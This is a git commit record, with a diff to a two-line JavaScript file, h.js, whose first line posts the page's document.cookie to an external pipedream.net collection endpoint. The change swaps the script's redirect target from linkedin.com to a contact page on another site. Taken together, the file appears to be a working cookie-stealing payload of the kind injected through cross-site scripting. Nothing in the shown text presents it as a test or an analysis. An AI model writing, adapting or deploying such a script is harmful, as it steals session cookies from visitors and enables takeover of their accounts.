e7be9a61181e81291ad7c5e8eca559d48863c5f9
h88u <159571030+h88u@users.noreply.github.com>
2024-02-10 12:48:07 -0500

    Update h.js

--- h.js
+++ h.js
@@ -1,2 +1,2 @@
 fetch('https://eoqo7l6qsvoadu4.m.pipedream.net', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:document.cookie})});
-window.location.replace('https://linkedin.com');
+window.location.replace('https://www.bezri.org/contact_us.php');
